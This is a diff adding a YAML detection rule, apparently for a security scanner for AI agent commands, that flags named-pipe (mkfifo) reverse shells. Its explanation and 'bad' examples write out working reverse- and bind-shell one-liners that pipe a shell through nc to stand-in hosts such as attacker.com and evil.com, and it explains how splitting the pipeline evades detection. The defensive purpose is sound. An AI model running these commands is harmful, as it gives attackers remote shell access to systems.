@@ -1,0 +1,67 @@
+id: "persistence-evasion/covert-channels/named-pipe"
+version: "1.0.0"
+kingdom: "Persistence & Defense Evasion"
+kingdom_id: 6
+category: "Covert Communication Channels"
+category_id: "6.8"
+name: "Named Pipe FIFO Covert Channel"
+risk_level: "high"
+
+abstract: |
+  Creating named pipes (FIFOs) via mkfifo to establish covert bidirectional communication
+  channels between processes, commonly used to build reverse shells and split exfiltration
+  chains across multiple processes to evade detection. The FIFO acts as an invisible
+  rendezvous point between attacker-controlled processes.
+
+explanation: |
+  Named pipes (FIFOs) created with mkfifo are special filesystem objects that provide
+  synchronous IPC between unrelated processes. They are a classic reverse shell
+  component:
+
+  ```
+  mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f
+  mkfifo /tmp/.pipe; bash -i < /tmp/.pipe | nc -l 8080 > /tmp/.pipe
+  mkfifo /dev/shm/p; nc attacker.com 4444 < /dev/shm/p | bash > /dev/shm/p
+  ```
+
+  The reverse shell pattern works by:
+  1. mkfifo creates the rendezvous FIFO
+  2. cat reads from the FIFO (initially blocks)
+  3. Shell executes commands received via the pipe
+  4. Output flows to nc which sends it to the attacker
+  5. Attacker's input flows back through the FIFO to the shell
+
+  This technique is effective because:
+  - Splits the reverse shell across multiple processes (cat, sh, nc) evading single-process detection
+  - The FIFO path (/tmp, /dev/shm) looks like a temporary file
+  - nc is only making a single outbound connection (appears legitimate)
+  - Each process appears innocuous in isolation
+
+recommendation: |
+  - Block mkfifo commands that are immediately followed by nc or reverse shell patterns.
+  - Use stateful/chain analysis to detect mkfifo combined with network tool pipeline patterns.
+  - Monitor FIFO creation in /tmp, /dev/shm, /var/tmp.
+  - Alert on shell processes that have both a FIFO and a network connection open simultaneously.
+
+examples:
+  bad:
+    - "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f"
+    - "mkfifo /dev/shm/p; nc evil.com 443 < /dev/shm/p | bash > /dev/shm/p"
+    - "mkfifo /tmp/.pipe && bash -i < /tmp/.pipe | nc -l 9001 > /tmp/.pipe"
+  good:
+    - "mkfifo /tmp/myapp-ipc"
+    - "mkfifo /run/app/control.sock"
+
+compliance:
+  owasp-llm-2025: ["LLM06", "LLM02"]
+  iso-27001-2022: ["A.8.3", "A.5.34"]
+  eu-ai-act-2024: ["Art.9", "Art.15"]
+  nist-ai-rmf-1.0: ["MANAGE-1", "MEASURE-2"]
+  soc2-type2: ["CC6.1", "CC6.6"]
+
+references:
+  mitre_attack: ["T1071.001", "T1059.004"]
+  cwe: ["CWE-78", "CWE-200"]
+
+analyzers: ["regex", "stateful"]
+related_rules: []
